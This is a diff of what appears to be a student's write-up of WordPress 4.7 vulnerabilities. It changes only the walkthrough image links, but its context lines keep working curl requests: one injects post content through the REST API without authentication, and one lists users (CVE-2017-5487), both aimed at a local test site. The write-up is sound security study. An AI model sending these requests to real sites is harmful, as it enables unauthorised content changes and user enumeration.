@@ -11,7 +11,7 @@ Time spent: **5** hours spent in total
     - Vulnerability types: Privalige escalation
     - Tested in version: 4.7
     - Fixed in version: 4.7.2
-  - [x] GIF Walkthrough: ![](https://imgur.com/a/GsrEu)
+  - [x] GIF Walkthrough: ![Imgur](https://imgur.com/a/GsrEu)
   - [x] Steps to recreate: Privilage Escalation.  Using the REST api, a URL post request can bypass the authentcation check and allow a non-authenticated user to make changes to a post.
 
         Valid request:  curl -X POST http://wpdistillery.dev/wp-json/wp/v2/posts/123?id=5 -d '{"content":"hcked content"}'
@@ -27,7 +27,7 @@ Time spent: **5** hours spent in total
     - Vulnerability types: Obtain Information
     - Tested in version: 4.7
     - Fixed in version: 4.7.1
-  - [x] GIF Walkthrough: ![]https://imgur.com/a/BubW1)
+  - [x] GIF Walkthrough: [Imgur](https://i.imgur.com/DxH5k0N.gifv)
   - [x] Steps to recreate: curl -X GET http://wpdistillery.dev/wp-json/wp/v2/users
   - [x] Affected source code: https://github.com/WordPress/WordPress/commit/daf358983cc1ce0c77bf6d2de2ebbb43df2add60
     - [Link 1](https://www.cvedetails.com/cve/CVE-2017-5487/)
